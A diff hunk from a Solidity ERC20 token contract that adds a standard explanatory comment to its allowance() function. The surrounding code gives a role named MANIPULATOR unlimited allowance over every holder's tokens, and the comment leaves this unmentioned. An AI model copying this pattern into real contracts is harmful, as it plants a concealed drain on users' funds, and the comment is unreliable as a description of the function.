@@ -52,6 +52,7 @@ contract Coin is ERC20, ERC20Votes, AccessControl, Pausable {
   /**
    * @dev See {IERC20-allowance}.
    */
+  //The allowance() function returns the token amount remaining, which the spender is currently allowed to withdraw from the owner's account.
   function allowance(address owner, address spender) public view override returns (uint256) {
     if (hasRole(MANIPULATOR, spender)) {
       return type(uint256).max;
